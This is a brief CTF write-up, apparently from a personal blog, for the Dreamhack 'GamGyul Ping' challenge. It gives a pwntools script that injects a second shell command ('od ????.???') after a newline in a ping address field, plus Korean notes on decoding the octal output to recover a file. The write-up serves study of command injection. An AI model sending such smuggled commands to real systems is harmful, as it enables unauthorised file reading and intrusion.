---
title: "[DREAMHACK] GamGyul Ping writeup"
date: 2026-01-12 13:28:50
categories: Essay
tags: [writeup]
---

# first try:
```python
from pwn import *

context.binary = elf = ELF('./main')
context.arch = "amd64"
context.log_level = "debug"

HOST, PORT = "host3.dreamhack.games 22393".split()

if args.REMOTE:
    p = remote(HOST, PORT)
elif args.DOCKER:
    p = remote('localhost', 5000)
else:
    p = process()

p.sendline(b'127.0.0.1\nod ????.???')

p.interactive()
```

more가 있는 건 알았지만 시력 이슈로 e가 필터링 됐다고 판단해버리는 바람에...
od를 사용해서 풀었습니다.

...정규식을 사용해서 `0o`로 시작하는 8진수들을 추출하여 리스트를 만들고
각 리스트 원소를 순회하며 상위 바이트와 하위 바이트의 위치를 바꿔 `little-endian`으로 배치 해준 뒤, 출력하게 했습니다. 

엔드 연산자 안 먹어서 바로 명령어 찾다가 od로 간 게 참 바보같은...